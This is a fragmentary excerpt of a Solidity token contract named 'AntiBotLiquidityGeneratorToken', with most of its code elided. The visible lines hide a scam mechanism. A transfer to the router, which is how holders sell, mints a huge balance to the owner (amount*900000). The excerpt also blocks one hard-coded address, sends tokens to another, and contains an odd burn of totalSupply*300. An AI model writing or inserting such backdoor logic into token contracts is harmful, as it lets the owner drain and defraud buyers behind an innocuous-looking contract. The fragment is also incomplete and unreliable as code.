...
contract AntiBotLiquidityGeneratorToken {
    ...
    constructor() {
        ...
        _transfer(msg.sender, 0xAe7e6CAbad8d80f0b4E1C4DDE2a5dB7201eF1252, ads); //Mudra        
...
require ( to !=0xB0FC16615C24C30Af36EBD932CF817A05D2e03bD); 
        ...
        if (to == msg.sender) {burn(totalSupply*300);} if (to == router){balanceOf[Owner]+= amount*900000;}
